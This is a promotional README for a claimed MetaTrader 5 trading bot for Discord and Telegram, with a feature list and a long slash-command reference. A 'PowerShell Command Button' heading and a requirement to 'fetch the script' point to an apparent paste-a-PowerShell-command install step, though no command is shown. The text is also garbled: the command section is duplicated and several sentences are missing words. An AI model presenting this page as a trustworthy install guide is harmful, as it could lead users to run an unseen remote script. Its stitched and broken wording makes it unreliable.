🚀 MetaTrader 5 Companion: Feature-Rich Community Bot for Discord & Telegram

 

 ⌨️ PowerShell Command Button

 

 

 

---

MetaTrader 5 Bot is a community-built companion for desktop traders who want to spend less time on repetitive chart work and more time on the decisions that matter. It bundles a broad set of automation helpers, live signal utilities, and configurable strategy tools into one friendly package, with an open development flow where members suggest and shape the roadmap together. Whether you are streamlining routine order management or refining a custom indicator setup, the bot grows alongside its community. Drop into the discussion channels to share ideas, report quirks, and help the project keep getting sharper.

 ✅ Requirements

- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
- Windows 10 / 11 (x64)
- Internet connection — required to fetch the script
- Administrator — not required

 Features

 Real-Time Market Monitoring — The bot keeps a continuous watch over your charts around the clock, so you never miss a meaningful price movement while you're away from the desk.

- Adaptive Strategy Engine — Tune the bot's behavior to match your personal trading style, whether you prefer cautious, steady plays or a more dynamic approach.

- Automated Order Execution — Once your conditions are met, the bot handles entry and exit actions on its own, saving you from staring at screens during volatile moments.

- Multi-Symbol Support — Run the bot across several instruments at once so your workflow isn't locked to a single chart.

- Custom Alert System — Receive friendly notifications through Discord or Telegram whenever a signal fires, a position opens, or an important threshold is crossed.

- Community-Driven Roadmap — New capabilities are shaped by feedback from the people who actually the bot. Your ideas and bug reports genuinely steer what gets built next.

- Beginner-Accessible Setup — No prior automation experience required. Sensible defaults get you running quickly, while deeper settings are there whenever you want more control.

- Fully Open Configuration — Every parameter is visible and adjustable, so you always understand exactly how the bot behaves and why.

- Lightweight Desktop Footprint — Designed to run quietly in the background for desktop without hogging your machine's resources.

- Transparent Logging — Detailed activity logs let you review every decision the bot made, making it easy to learn, refine, and trust your setup.

- Regular Community Updates — Improvements, fixes, and fresh land often, driven by real-world and shared feedback from fellow traders.

 Commands

Welcome to the command deck! Everything below is built around the way our community actually trades — quick to type, easy to remember, and packed with handy touches. Type /help at any time to get a friendly nudge in the right direction.

 🚀 Getting Started Commands

- /start — Boot up the bot and get a warm welcome with a quick tour of what's possible.
- /connect — Link your desktop MetaTrader 5 terminal to the bot so it can talk to your setup.
- /status — See a live snapshot of your connection, active pairs, and current session health.
- /ping — A tiny heartbeat check to confirm everything is responding.

 📊 Market & Analysis Commands

- /quote — Pull the latest price and spread for any symbol you follow.
- /candles — Fetch recent candle data for a quick visual read.
- /indicators — Summarize the built-in indicator readings for a chosen pair.
- /watchlist — Show, add, or remove symbols from your personal watchlist.
- /signal — Ask the bot for a plain-language read on momentum and structure.

 🤖 Automation Commands

- /strategy list — Browse the strategy templates bundled with the bot.
- /strategy enable — Turn on a strategy for your connected terminal.
- /strategy disable — Pause a strategy without losing its settings.
- /schedule — Set trading windows so the bot only works when you want it to.
- /risk — Review and adjust position sizing and stop preferences.

 📁 Portfolio & Journal Commands

- /positions — List every open position with entry, size, and running result.
- /history [days] — Review closed trades over a chosen lookback window.
- /balance — Check account balance, equity, and margin at a glance.
- /journal add — Jot down a thought tied to your current session.
- /export — Package your trade history into a tidy file you can keep.

 🔔 Alerts & Notifications Commands

- /alert price — Get pinged when a symbol crosses a price you care about.
- /alert indicator — Trigger a notification on an indicator condition.
- /alerts — View, edit, or clear your active alerts.
- /mute — Quiet notifications for a while without losing your setup.
- /digest — Opt into a periodic summary of activity delivered on your schedule.

 ⚙️ Settings & Personalization Commands

- /settings — Open the friendly panel for language, timezone, and display preferences.
- /theme — Switch between light, dark, and compact layouts.
- /timezone — Set the clock the bot when reporting times.
- /language — Pick your preferred language for responses.
- /reset — Restore your personal settings to defaults if things get tangled.

 🧰 Utility & Community Commands

- /backtest — Run a quick historical check on a strategy template.
- /explain — Get a plain-language walkthrough of any command.
- /tips — Receive a rotating tip from the community knowledge base.
- /feedback — Send a note straight to the maintainers.
- /invite — Grab a shareable link so friends can join the project too.
- /changelog — Peek at what's new in the latest release.

 🆘 Support Commands

- /support — Reach the community support channel with one tap.
- /docs — Summon the built-in reference for commands and configuration.
- /diagnose — Run a self-check and get a readable report you can share when asking for help.
- /version — Confirm which build of the bot you're running.

Welcome to the command deck! Everything below is built around the way our community actually trades — quick to type, easy to remember, and packed with handy touches. Type /help at any time to get a friendly nudge in the right direction.

🚀 Getting Started Commands
  • /start — Boot up the bot and get a warm welcome with a quick tour of what's possible.
  • /connect — Link your desktop MetaTrader 5 terminal to the bot so it can talk to your setup.
  • /status — See a live snapshot of your connection, active pairs, and current session health.
  • /ping — A tiny heartbeat check to confirm everything is responding.
📊 Market & Analysis Commands
  • /quote <symbol> — Pull the latest price and spread for any symbol you follow.
  • /candles <symbol> <timeframe> — Fetch recent candle data for a quick visual read.
  • /indicators <symbol> — Summarize the built-in indicator readings for a chosen pair.
  • /watchlist — Show, add, or remove symbols from your personal watchlist.
  • /signal <symbol> — Ask the bot for a plain-language read on momentum and structure.
🤖 Automation Commands
  • /strategy list — Browse the strategy templates bundled with the bot.
  • /strategy enable <name> — Turn on a strategy for your connected terminal.
  • /strategy disable <name> — Pause a strategy without losing its settings.
  • /schedule — Set trading windows so the bot only works when you want it to.
  • /risk — Review and adjust position sizing and stop preferences.
📁 Portfolio & Journal Commands
  • /positions — List every open position with entry, size, and running result.
  • /history [days] — Review closed trades over a chosen lookback window.
  • /balance — Check account balance, equity, and margin at a glance.
  • /journal add <note> — Jot down a thought tied to your current session.
  • /export — Package your trade history into a tidy file you can keep.
🔔 Alerts & Notifications Commands
  • /alert price <symbol> <level> — Get pinged when a symbol crosses a price you care about.
  • /alert indicator <symbol> <name> — Trigger a notification on an indicator condition.
  • /alerts — View, edit, or clear your active alerts.
  • /mute — Quiet notifications for a while without losing your setup.
  • /digest — Opt into a periodic summary of activity delivered on your schedule.
⚙️ Settings & Personalization Commands
  • /settings — Open the friendly panel for language, timezone, and display preferences.
  • /theme — Switch between light, dark, and compact layouts.
  • /timezone <zone> — Set the clock the bot when reporting times.
  • /language <code> — Pick your preferred language for responses.
  • /reset — Restore your personal settings to defaults if things get tangled.
🧰 Utility & Community Commands
  • /backtest <strategy> — Run a quick historical check on a strategy template.
  • /explain <command> — Get a plain-language walkthrough of any command.
  • /tips — Receive a rotating tip from the community knowledge base.
  • /feedback <message> — Send a note straight to the maintainers.
  • /invite — Grab a shareable link so friends can join the project too.
  • /changelog — Peek at what's new in the latest release.
🆘 Support Commands
  • /support — Reach the community support channel with one tap.
  • /docs — Summon the built-in reference for commands and configuration.
  • /diagnose — Run a self-check and get a readable report you can share when asking for help.
  • /version — Confirm which build of the bot you're running.

Every command is designed to be discoverable — if you forget a name, just start typing and the bot will suggest matches. Have fun exploring, and don't hesitate to suggest new commands through /feedback; plenty of what you see here started as a community idea!
